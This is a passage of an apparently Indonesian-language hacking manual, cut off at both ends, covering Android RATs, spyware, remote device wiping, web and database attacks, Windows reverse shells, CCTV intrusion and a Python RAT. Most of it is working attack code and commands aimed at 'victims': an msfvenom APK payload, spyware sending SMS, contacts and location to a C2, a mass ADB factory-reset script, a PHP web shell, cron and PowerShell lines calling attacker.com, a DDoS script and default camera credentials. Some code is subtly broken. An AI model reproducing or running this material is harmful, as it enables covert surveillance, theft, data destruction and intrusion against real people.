    echo "<td>{$row['ip']}</td>";
    echo "<td style='color:$status_color'>{$row['status']}</td>";
    echo "<td>{$row['last_seen']}</td>";
    echo "<td>
        <form method='post' action='send_command.php'>
            <input type='hidden' name='victim_id' value='{$row['id']}'>
            <input type='text' name='command' placeholder='Command'>
            <input type='submit' value='Kirim'>
        </form>
    </td>";
    echo "</tr>";
}
echo "</table>";
?>
```

---
#### **📌 Deployment Script (`rat_deploy.sh`)**
```bash
#!/bin/bash
# RAT Deployment Script 2026
# Usage: ./rat_deploy.sh IP_VPS

VPS_IP=$1

if [ -z "$VPS_IP" ]; then
    echo "Usage: ./rat_deploy.sh IP_VPS_KAMU"
    exit 1
fi

echo "[*] ========================================"
echo "[*] RAT Deployment — Target: $VPS_IP"
echo "[*] ========================================"

# 1. Cek C2 server jalan
echo "[*] Step 1: Cek C2 server..."
if ! nc -z $VPS_IP 8080 2>/dev/null; then
    echo "[!] C2 server belum jalan di $VPS_IP:8080"
    echo "[*] Upload dan jalankan c2_server.py dulu:"
    echo "    scp c2_server.py root@$VPS_IP:~/"
    echo "    ssh root@$VPS_IP 'pip3 install websockets && nohup python3 c2_server.py &'"
    exit 1
fi
echo "[+] C2 server aktif"

# 2. Bikin payload
echo "[*] Step 2: Bikin payload..."
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=$VPS_IP LPORT=4444 -o rat_payload.apk

# 3. Bikin handler config
cat > handler.rc << EOF
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

echo "[*] Step 3: Handler config dibuat (handler.rc)"

# 4. Instruksi
echo ""
echo "[*] ========================================"
echo "[*] SELESAI. Langkah selanjutnya:"
echo "[*] ========================================"
echo ""
echo "1. Jalankan handler di VPS:"
echo "   ssh root@$VPS_IP"
echo "   msfconsole -r handler.rc"
echo ""
echo "2. Kirim rat_payload.apk ke korban"
echo "   (social engineering — lihat Bab 9)"
echo ""
echo "3. Setelah korban install & buka:"
echo "   sessions -l          # Lihat korban"
echo "   sessions -i 1        # Ambil alih"
echo ""
echo "[*] Payload connect ke: $VPS_IP:4444"
echo "[*] Bisa diakses dari mana saja di dunia"
echo "[*] Selama korban punya internet, kamu bisa kontrol"
```

**Jalankan:**
```bash
chmod +x rat_deploy.sh
./rat_deploy.sh 123.45.67.89  # Ganti dengan IP VPS
```

---
#### **📌 Anti-Uninstall Techniques (2026)**
RAT modern menggunakan **Accessibility Services** untuk:
1. **Auto-klik "Cancel"** saat korban mencoba uninstall.
2. **Disguise as System App** (nama package: `com.google.android.gms.fake`).
3. **Hidden Icon** (tidak muncul di launcher).
4. **Device Admin API** (korban harus remove admin dulu).

**Contoh Kode (Java - untuk APK):**
```java
// AccessibilityService untuk anti-uninstall
public class AntiUninstallService extends AccessibilityService {
    @Override
    public void onInterrupt() {}

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            AccessibilityNodeInfo node = getRootInActiveWindow();
            if (node != null) {
                // Cek apakah di halaman uninstall
                if (node.getText() != null && node.getText().toString().contains("Uninstall")) {
                    // Klik tombol "Cancel"
                    List<AccessibilityNodeInfo> cancelButtons = node.findAccessibilityNodeInfosByText("Cancel");
                    for (AccessibilityNodeInfo button : cancelButtons) {
                        button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        break;
                    }
                }
            }
        }
    }
}
```

---
### **4.4 Spyware & Monitoring**
---
#### **📌 Spyware Android Modern (Fitur 2026)**
| Fitur | Implementasi | Keterangan |
|-------|-------------|------------|
| **Keylogger** | Accessibility Services | Merekam semua input keyboard |
| **Screen Recording** | MediaProjection API | Rekam layar |
| **Screen Streaming** | WebSocket frame | Real-time (bukan screenshot berkala) |
| **Mic Recording** | AudioRecord background | Rekam suara terus-menerus |
| **Camera** | Camera2 API | Foto diam-diam |
| **Location** | FusedLocationProvider | GPS real-time |
| **Notification Capture** | NotificationListenerService | Baca notifikasi |
| **Call Recording** | MediaRecorder + Accessibility | Rekam panggilan |
| **Clipboard** | ClipboardManager listener | Monitor clipboard |
| **App Usage** | UsageStatsManager | Lihat app yang dipakai |

---
#### **📌 Spyware Python (Termux)**
**File: `spyware.py`**
```python
#!/usr/bin/env python3
import subprocess
import json
import socket
import time
from datetime import datetime

class AndroidSpyware:
    def __init__(self, c2_server, c2_port=8080):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.device_id = subprocess.getoutput("settings get secure android_id").strip()

    def get_location(self):
        """Extract lokasi GPS"""
        try:
            result = subprocess.getoutput(
                "dumpsys location | grep -E 'Latitude|Longitude|Accuracy'"
            )
            return {"location": result.strip().split('\n')}
        except:
            return {"location": "unknown"}

    def get_sms(self):
        """Extract SMS messages"""
        try:
            result = subprocess.getoutput(
                "content query --uri content://sms/ | grep -E 'address|body|date'"
            )
            return {"sms": result.strip().split('\n')}
        except:
            return {"sms": "access_denied"}

    def get_contacts(self):
        """Extract contacts"""
        try:
            result = subprocess.getoutput(
                "content query --uri content://contacts/contacts | grep -E 'display_name|phone'"
            )
            return {"contacts": result.strip().split('\n')}
        except:
            return {"contacts": "access_denied"}

    def get_call_logs(self):
        """Extract call logs"""
        try:
            result = subprocess.getoutput(
                "content query --uri content://call_log/calls | grep -E 'number|duration|date'"
            )
            return {"calls": result.strip().split('\n')}
        except:
            return {"calls": "access_denied"}

    def send_to_c2(self, data):
        """Send stolen data ke C2 server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.c2_server, self.c2_port))

            payload = json.dumps({
                "timestamp": datetime.now().isoformat(),
                "device_id": self.device_id,
                "data": data
            })
            sock.send(payload.encode())
            sock.close()
        except Exception as e:
            print(f"[-] Failed to send data: {e}")

    def start_surveillance(self):
        """Start continuous surveillance"""
        print("[*] Starting surveillance...")
        while True:
            stolen_data = {
                "location": self.get_location(),
                "sms": self.get_sms(),
                "contacts": self.get_contacts(),
                "calls": self.get_call_logs()
            }
            self.send_to_c2(stolen_data)
            time.sleep(60)  # Kirim data tiap 60 detik

if __name__ == "__main__":
    C2_SERVER = "192.168.1.100"  # Ganti dengan IP VPS/C2
    spyware = AndroidSpyware(C2_SERVER)
    spyware.start_surveillance()
```

---
### **4.5 Reset & Destruksi Jarak Jauh**
---
#### **📌 Factory Reset Android via ADB**
```bash
# Reboot ke recovery mode
adb reboot recovery

# Wipe data (factory reset)
adb shell "cmd recovery --wipe_data"

# Atau via DevicePolicyManager (jika RAT punya device admin)
adb shell "dpm wipe_data"
```

---
#### **📌 Script Reset Multiple Devices**
**File: `android_reset.sh`**
```bash
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
TARGET_SUBNET="${1:-192.168.1.0/24}"
ADB_PORT=5555
LOG_FILE="android_reset_$(date +%s).log"

log() { echo -e "${GREEN}[$(date +'%H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"; }
error() { echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"; exit 1; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1" | tee -a "$LOG_FILE"; }

log "Checking dependencies..."
command -v adb >/dev/null 2>&1 || error "adb not installed. Install with: sudo apt-get install android-tools-adb"
command -v nmap >/dev/null 2>&1 || error "nmap not installed. Install with: sudo apt-get install nmap"

log "Scanning subnet: $TARGET_SUBNET for ADB devices..."
nmap -p $ADB_PORT "$TARGET_SUBNET" -Pn --open -oG - 2>/dev/null | grep "5555/open" | awk '{print $2}' > /tmp/adb_hosts.txt

if [ ! -s /tmp/adb_hosts.txt ]; then
    warn "No ADB devices found on nmap. Trying arp-scan fallback..."
    arp-scan -l 2>/dev/null | grep -i "android\|nexus\|pixel" | awk '{print $1}' > /tmp/adb_hosts.txt || true
fi

[ -s /tmp/adb_hosts.txt ] || error "No Android devices detected"

DEVICE_COUNT=$(wc -l < /tmp/adb_hosts.txt)
log "Found $DEVICE_COUNT device(s)"

while IFS= read -r device_ip; do
    log "======================================="
    log "Processing device: $device_ip"
    log "======================================="

    adb disconnect "$device_ip:$ADB_PORT" 2>/dev/null || true
    sleep 1

    if adb connect "$device_ip:$ADB_PORT" 2>&1 | grep -q "connected"; then
        log "Connected to $device_ip successfully"

        ANDROID_VERSION=$(adb -s "$device_ip:$ADB_PORT" shell "getprop ro.build.version.release")
        DEVICE_NAME=$(adb -s "$device_ip:$ADB_PORT" shell "getprop ro.product.model")

        log "Device detected: $DEVICE_NAME"
        log "Android version: $ANDROID_VERSION"
        log "Starting factory reset..."

        adb -s "$device_ip:$ADB_PORT" reboot recovery >/dev/null 2>&1
        sleep 5

        log "Device in recovery. Executing wipe..."
        adb -s "$device_ip:$ADB_PORT" shell "cmd recovery --wipe_data" >/dev/null 2>&1 || true

        log "Wipe command sent. Device will reboot..."
        log "Monitoring boot completion (timeout: 5 minutes)..."
        for i in {1..60}; do
            if adb -s "$device_ip:$ADB_PORT" shell "getprop sys.boot_completed" 2>/dev/null | grep -q "1"; then
                log "✓ Reset successful on $device_ip"
                break
            fi
            echo -ne "\rChecking boot status: $i/60"
            sleep 5
        done
    else
        warn "Failed to connect to $device_ip via ADB network"
    fi

    adb disconnect "$device_ip:$ADB_PORT" 2>/dev/null || true
    sleep 2
done < /tmp/adb_hosts.txt

log "======================================="
log "All devices processed"
log "======================================="

adb disconnect 2>/dev/null || true
rm -f /tmp/adb_hosts.txt

log "Execution complete. Log saved: $LOG_FILE"
```

**Cara Pakai:**
```bash
chmod +x android_reset.sh
./android_reset.sh 192.168.1.0/24
```

---
---
---

## **🔹 BAB 5: SERANGAN WEBSITE & DATABASE**

---
### **5.1 SQL Injection & Database Breaches**
---
#### **📌 SQLMap untuk Automated Injection**
```bash
# Test vulnerability
sqlmap -u "http://target.com/product.php?id=1" --dbs

# Enumerate databases
sqlmap -u "http://target.com/product.php?id=1" -D "mysql" --tables

# Extract data
sqlmap -u "http://target.com/product.php?id=1" -D "mysql" -T "users" --dump

# Dump semua (otomatis)
sqlmap -u "http://target.com/product.php?id=1" --dump-all --batch
```

---
#### **📌 Manual SQL Injection**
**Blind SQL Injection Time-Based:**
```
Input: ' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) -- -
```
- Jika response **lambat 5 detik** → karakter pertama password adalah `'a'`.
- Ulangi untuk setiap karakter.

**Union-Based SQLi:**
```
Input: ' UNION SELECT 1,2,3,username,password FROM users -- -
```
- Jika output menampilkan username & password → **vulnerable**.

---
#### **📌 Bypass WAF (Web Application Firewall)**
```bash
# Gunakan tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --level=5 --risk=3

# Tamper scripts populer:
# - space2comment: Ganti spasi dengan komentar SQL
# - randomcase: Randomize case keyword SQL
# - between: Ganti `>` dengan `BETWEEN`
# - chardoubleencode: Double URL encoding
```

---
### **5.2 Web Shell Upload & Execution**
---
#### **📌 Upload PHP Shell**
**Contoh Web Shell (`shell.php`):**
```php
<?php
// Simple PHP shell
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```
**Cara Upload:**
1. Cari **file upload vulnerability** (contoh: form upload di website).
2. Upload `shell.php` dengan **bypass filtering**:
   - Ganti extension: `shell.php` → `shell.phtml`, `shell.php5`
   - Double extension: `shell.php.jpg`
   - Null byte: `shell.php%00.jpg`
   - Case variation: `shell.pHp`

3. Akses shell:
   ```
   http://target.com/uploads/shell.php?cmd=ls%20-la
   ```

---
#### **📌 Server-Side Template Injection (SSTI)**
**Test Vulnerability:**
```
Input: {{7*7}}  # Jinja2
Response: 49 → Vulnerable!
```

**Exploit (Jinja2):**
```
{{ config.items() }}  # Baca config
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}  # RCE
```

---
### **5.3 Server Compromise & Persistence**
---
#### **📌 SSH Key Injection**
```bash
# Jika sudah dapat shell di server
cd /home/target_user/.ssh
echo "ssh-rsa AAAA...your_public_key... attacker@machine" >> authorized_keys

# Sekarang bisa SSH langsung
ssh target_user@target.com
```

---
#### **📌 Cron Job Backdoor**
```bash
# Inject cron job untuk reverse shell
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -

# Setiap menit akan execute reverse shell
```

---
#### **📌 Database User Escalation**
```sql
-- Jika dapat akses MySQL
CREATE USER 'attacker'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Sekarang punya akses database full
```

---
### **5.4 DDoS & DoS Attack**
---
#### **📌 hping3 (SYN/UDP Flood)**
```bash
# SYN Flood
hping3 -S --flood -p 80 target.com

# UDP Flood
hping3 --udp --flood -p 53 target.com

# ACK Flood
hping3 -A --flood -p 80 target.com
```

---
#### **📌 Slowloris (HTTP Slow Attack)**
```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py target.com -p 80 -s 500
```

---
#### **📌 Python DDoS Script**
**File: `ddos.py`**
```python
#!/usr/bin/env python3
import socket
import threading
import sys
import random

class DDosAttacker:
    def __init__(self, target_ip, target_port, num_threads=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.running = True

    def attack(self):
        """Send packets ke target"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
                sock.close()
            except:
                pass

    def start(self):
        """Start DDoS dengan multiple threads"""
        print(f"[*] Starting DDoS attack on {self.target_ip}:{self.target_port}")
        print(f"[*] Threads: {self.num_threads}")

        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.attack, daemon=True)
            threads.append(t)
            t.start()

        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\n[!] Attack stopped")
            self.running = False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 ddos.py <target_ip> [port] [threads]")
        print("Example: python3 ddos.py 192.168.1.1 80 100")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    attacker = DDosAttacker(target, port, threads)
    attacker.start()
```

---
---
---

## **🔹 BAB 6: SERANGAN KOMPUTER (DESKTOP/LAPTOP)**

---
### **6.1 Metasploit Windows Exploitation**
---
#### **📌 Generate Windows Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    -f exe -o payload.exe
```

**Untuk Bypass AV (Antivirus):**
```bash
# Encoding (shikata_ga_nai)
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.1.100 LPORT=443 \
    -e x86/shikata_ga_nai -i 5 \
    -f exe -o encoded_payload.exe
```

---
#### **📌 Handler Setup**
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
exploit -j
```

---
#### **📌 Post-Exploitation Commands (Meterpreter)**
```bash
# Informasi sistem
sysinfo
getuid

# Dump password
hashdump
mimikatz_command -f sekurlsa::logonpasswords

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump

# Remote shell
shell

# Upload/Download file
upload malware.exe C:\Windows\Temp\
download C:\Users\user\Documents\secret.txt

# Persistence
run persistence -X -i 5 -p 4444 -r 192.168.1.100
```

---
### **6.2 Custom Windows Reverse Shell (C++)**
**File: `shell.cpp`**
```cpp
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    char ip[] = "192.168.1.100";  // Attacker IP
    int port = 4444;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        for (int i = 0; i < 3; i++) {
            dup2(sock, i);
        }
        char cmd[] = "cmd.exe";
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi;
        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
```

**Compile (Windows):**
```bash
# Di CMD (Windows)
cl.exe /W0 shell.cpp ws2_32.lib
# Output: shell.exe
```

---
### **6.3 Living Off The Land (LotL)**
**Teknik:** Menggunakan tools yang sudah ada di sistem (bukan malware eksternal).

---
#### **📌 PowerShell Fileless Attack**
```powershell
# Download & execute langsung (tidak menyimpan file)
powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Atau download ke temp, execute, delete
powershell -w hidden -c "$w=New-Object Net.WebClient;$w.DownloadFile('http://attacker.com/p.ps1','$env:TEMP\svchost.ps1');Start-Process '$env:TEMP\svchost.ps1';Remove-Item '$env:TEMP\svchost.ps1' -Force"
```

---
#### **📌 WMI Persistence**
```powershell
# WMI Event Subscription (stealth, survive reboot)
$filterName = "SystemFilter"
$consumerName = "SystemConsumer"
$exePath = "C:\Windows\Temp\payload.exe"

# Buat event filter
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

# Buat command line event consumer
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $exePath
}

# Bind filter ke consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---
### **6.4 Token Theft & Session Hijacking**
---
#### **📌 Token Theft (Tren 2026)**
**Mengapa Token?** Banyak aplikasi modern (Gmail, Facebook, dll) menggunakan **session token** yang disimpan di:
- **Cookies** (browser)
- **localStorage** (JavaScript apps)
- **Memory** (aplikasi desktop)

**Tools:**
- **LummaC2** / **Vidar** / **Stealc** (infostealer populer 2026)
- **TokenTactics** (manipulasi Azure AD tokens)

---
#### **📌 Extract Token dari Browser**
**Cara 1: Manual (Chrome)**
1. Buka `chrome://flags/#enable-experimental-accessibility-features` → Enable.
2. Buka DevTools (`F12`) → **Application** → **Cookies** → Copy token.
3. Gunakan **EditThisCookie** extension untuk export/import cookies.

**Cara 2: PowerShell (Post-Exploitation)**
```powershell
# Extract Chrome cookies (memerlukan decryption)
# Tools: SharpChrome (C#)
# Atau gunakan Mimikatz:
mimikatz_command -f sekurlsa::logonpasswords
```

---
#### **📌 Session Hijacking dengan Cookies**
Jika Anda punya **session cookies** korban, Anda bisa **login sebagai korban tanpa password**:
1. Buka browser (Chrome/Firefox).
2. Install **EditThisCookie** extension.
3. Import cookies korban.
4. Buka `gmail.com` → **Anda sudah login sebagai korban!**

---
---
---

## **🔹 BAB 7: CCTV HACKING**

---
### **7.1 Shodan untuk CCTV Discovery**
**Shodan Dorks untuk CCTV:**
```
"Server: IP Webcam"
"D-Link" "http auth"
"Axis" "camera" "server"
"Hikvision" "DVR"
"XiongMai" "port:34567"
"RTSP" "port:554"
```

**Cara Pakai:**
```bash
# Install Shodan CLI
pip install shodan

# Login (daftar di shodan.io)
shodan init YOUR_API_KEY

# Search CCTV
shodan search "cctv" country:ID
shodan host 192.168.1.100
```

---
### **7.2 CCTV Exploit Script (Python)**
**File: `cctv_hacker.py`**
```python
#!/usr/bin/env python3
import requests
import base64
from requests.auth import HTTPBasicAuth
import json

class CCTVHacker:
    def __init__(self, target_ip, port=80, username="admin", password="admin"):
        self.target = f"http://{target_ip}:{port}"
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.auth = HTTPBasicAuth(username, password)
        self.session.verify = False  # Ignore SSL errors

    def identify_camera(self):
        """Identify camera model dan firmware"""
        try:
            # Coba endpoint umum
            endpoints = [
                "/cgi-bin/magicBox.cgi?action=getSystemInfo",  # Hikvision
                "/cgi-bin/hi3510/param.cgi",                     # Dahua
                "/ISAPI/System/deviceInfo",                      # Standard ONVIF
                "/web/cgi-bin/hi3510/param.cgi?cmd=getdevicetype" # Generic
            ]

            for endpoint in endpoints:
                resp = self.session.get(f"{self.target}{endpoint}", timeout=5)
                if resp.status_code == 200:
                    print(f"[+] Camera identified: {resp.text[:200]}")
                    return resp.text
        except Exception as e:
            print(f"[-] Identification failed: {e}")
        return None

    def get_live_stream_url(self):
        """Extract live streaming URL"""
        # Format RTSP umum
        rtsp_urls = [
            f"rtsp://{self.username}:{self.password}@{self.target.split('://')[1]}/ISAPI/Streaming/channels/101",  # Hikvision
            f"rtsp://{self.username}:{self.password}@{self.target.split('://')[1]}/h264",                         # Dahua
            f"rtsp://{self.target.split('://')[1]}/live.sdp",                                                     # Generic
            f"rtsp://{self.username}:{self.password}@{self.target.split('://')[1]}/stream1"                       # Alternatif
        ]

        for url in rtsp_urls:
            print(f"[+] Possible stream URL: {url}")
        return rtsp_urls[0]

    def capture_snapshot(self, output_file="camera.jpg"):
        """Capture current frame"""
        try:
            # Coba endpoint snapshot
            snapshot_endpoints = [
                "/cgi-bin/magicBox.cgi?action=getSnapshot",
                "/cgi-bin/snapshot.cgi",
                "/ISAPI/Streaming/channels/1/picture",
                "/web/cgi-bin/hi3510/snapshot.cgi"
            ]

            for endpoint in snapshot_endpoints:
                resp = self.session.get(f"{self.target}{endpoint}", timeout=5)
                if resp.status_code == 200 and resp.content:
                    with open(output_file, 'wb') as f:
                        f.write(resp.content)
                    print(f"[+] Snapshot saved: {output_file}")
                    return True
        except Exception as e:
            print(f"[-] Snapshot failed: {e}")
        return False

    def enable_disable_recording(self, enable=True):
        """Control recording"""
        action = "enable" if enable else "disable"
        endpoints = [
            f"/cgi-bin/magicBox.cgi?action={action}Record",
            f"/cgi-bin/recording.cgi?action={action}"
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.get(f"{self.target}{endpoint}", timeout=5)
                if resp.status_code == 200:
                    print(f"[+] Recording {action}d")
                    return True
            except:
                continue
        print(f"[-] Recording control failed")
        return False

    def reboot_camera(self):
        """Restart camera"""
        endpoints = [
            "/cgi-bin/magicBox.cgi?action=reboot",
            "/cgi-bin/system.cgi?action=reboot",
            "/ISAPI/System/reboot"
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.get(f"{self.target}{endpoint}", timeout=5)
                if resp.status_code == 200:
                    print("[+] Camera rebooted")
                    return True
            except:
                continue
        print("[-] Reboot failed")
        return False

    def extract_video_files(self):
        """List recorded videos"""
        endpoints = [
            "/cgi-bin/magicBox.cgi?action=getFileList",
            "/cgi-bin/filelist.cgi",
            "/ISAPI/ContentMgmt/RecordFile"
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.get(f"{self.target}{endpoint}", timeout=5)
                if resp.status_code == 200:
                    files = resp.text.split('\n')
                    print("[+] Recorded files:")
                    for f in files:
                        if f.strip():
                            print(f"    {f}")
                    return files
            except:
                continue
        print("[-] File listing failed")
        return []

    def download_recording(self, filename, output="recording.mp4"):
        """Download recorded video"""
        endpoints = [
            f"/cgi-bin/magicBox.cgi?action=getFile&name={filename}",
            f"/cgi-bin/download.cgi?file={filename}",
            f"/ISAPI/ContentMgmt/Download?file={filename}"
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.get(f"{self.target}{endpoint}", timeout=10)
                if resp.status_code == 200 and resp.content:
                    with open(output, 'wb') as f:
                        f.write(resp.content)
                    print(f"[+] Recording downloaded: {output}")
                    return True
            except:
                continue
        print("[-] Download failed")
        return False

    def modify_config(self, param, value):
        """Modify camera configuration"""
        payload = f"action=setConfig&{param}={value}"
        endpoints = [
            "/cgi-bin/magicBox.cgi",
            "/cgi-bin/config.cgi",
            "/ISAPI/System/Config"
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.post(
                    f"{self.target}{endpoint}",
                    data=payload,
                    timeout=5
                )
                if resp.status_code == 200:
                    print(f"[+] Config modified: {param}={value}")
                    return True
            except:
                continue
        print("[-] Config modification failed")
        return False

# Usage
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 cctv_hacker.py <target_ip> [username] [password] [port]")
        print("Example: python3 cctv_hacker.py 192.168.1.100 admin admin 8080")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else "admin"
    password = sys.argv[3] if len(sys.argv) > 3 else "admin"
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 80

    cctv = CCTVHacker(target_ip, port, username, password)
    cctv.identify_camera()
    cctv.get_live_stream_url()
    cctv.capture_snapshot()
    cctv.extract_video_files()
```

---
### **7.3 Akses, Kontrol, & Data Extraction**
---
#### **📌 Default Credentials CCTV**
| Merek | Username | Password |
|-------|----------|----------|
| Hikvision | admin | 12345 |
| Dahua | admin | admin |
| Axis | root | pass |
| D-Link | admin | (kosong) |
| XiongMai | admin | admin |
| Sony | admin | admin |
| Panasonic | admin | 12345 |

---
#### **📌 Akses RTSP Stream**
```bash
# View stream dengan VLC
vlc rtsp://admin:12345@192.168.1.100:554/stream1

# Atau dengan FFmpeg (simpan ke file)
ffmpeg -i rtsp://admin:12345@192.168.1.100:554/stream1 -c copy output.mp4
```

---
#### **📌 ARP Spoofing untuk Disconnect CCTV**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof (gateway: 192.168.1.1, CCTV: 192.168.1.100)
arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1

# Block traffic ke CCTV
iptables -t nat -A PREROUTING -p tcp -d 192.168.1.100 --dport 80 -j DROP
iptables -t nat -A PREROUTING -p tcp -d 192.168.1.100 --dport 554 -j DROP
```

---
---
---

## **🔹 BAB 8: SPYWARE & RAT (REMOTE ACCESS TROJAN)**

---
### **8.1 RAT Architecture**
RAT terdiri dari 3 komponen utama:
1. **Control Server** (C2) – Mengirimkan command.
2. **Payload/Agent** – Berjalan di device korban.
3. **Command & Control (C2) Protocol** – Komunikasi terenkripsi.

---
### **8.2 Python RAT (Server & Client)**
---
#### **📌 Server (Control Panel)**
**File: `rat_server.py`**
```python
#!/usr/bin/env python3
import socket
import threading
import sys
import json

class RATServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}  # {client_address: socket}

    def start(self):
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] RAT Server listening on {self.host}:{self.port}")

        while True:
            client_socket, addr = self.server.accept()
            print(f"[+] New connection from {addr[0]}:{addr[1]}")
            self.clients[addr] = client_socket

            thread = threading.Thread(
                target=self.handle_client,
                args=(client_socket, addr),
                daemon=True
            )
            thread.start()

    def handle_client(self, sock, addr):
        try:
            # Terima info device
            data = sock.recv(1024).decode()
            if not data:
                return

            print(f"[*] {addr} >> {data}")

            while True:
                # Terima command dari user
                cmd = input(f"[{addr[0]}:{addr[1]}] Command > ")
                if cmd.lower() == 'exit':
                    break

                sock.send(cmd.encode())

                # Terima output
                output = sock.recv(4096).decode()
                print(output)

        except Exception as e:
            print(f"[-] Connection lost: {e}")
        finally:
            sock.close()
            if addr in self.clients:
                del self.clients[addr]

    def broadcast(self, message):
        """Kirim command ke semua client"""
        for addr, sock in self.clients.items():
            try:
                sock.send(message.encode())
            except:
                pass

if __name__ == "__main__":
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    else:
        port = 5555

    server = RATServer(port=port)
    server.start()
```

---
#### **📌 Client (Payload/Agent)**
**File: `rat_client.py`**
```python
#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import platform

class RATClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.socket.connect((self.server_ip, self.server_port))
            print(f"[+] Connected to {self.server_ip}:{self.server_port}")

            # Kirim info sistem
            system_info = {
                "hostname": os.uname().nodename,
                "os": platform.system() + " " + platform.release(),
                "user": os.getlogin(),
                "pwd": os.getcwd()
            }
            self.socket.send(json.dumps(system_info).encode())

            # Command loop
            self.command_loop()

        except Exception as e:
            print(f"[-] Connection failed: {e}")
            sys.exit(1)

    def command_loop(self):
        while True:
            try:
                # Terima command
                cmd = self.socket.recv(1024).decode()
                if cmd.lower() == 'exit':
                    break

                # Execute command
                if cmd.startswith("cd "):
                    os.chdir(cmd[3:])
                    output = f"Changed directory to {os.getcwd()}"
                else:
                    output = subprocess.check_output(
                        cmd,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        text=True
                    )

                # Kirim output
                self.socket.send(output.encode())

            except Exception as e:
                self.socket.send(f"Error: {str(e)}".encode())

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 rat_client.py <server_ip> <server_port>")
        sys.exit(1)

    SERVER_IP = sys.argv[1]
    SERVER_PORT = int(sys.argv[2])

    client = RATClient(SERVER_IP, SERVER_PORT)
    client.connect()
```

---
#### **📌 Cara Pakai RAT:**
1. **Jalankan Server**:
   ```bash
   python3 rat_server.py 5555
   ```
2. **Generate Client (Payload)**:
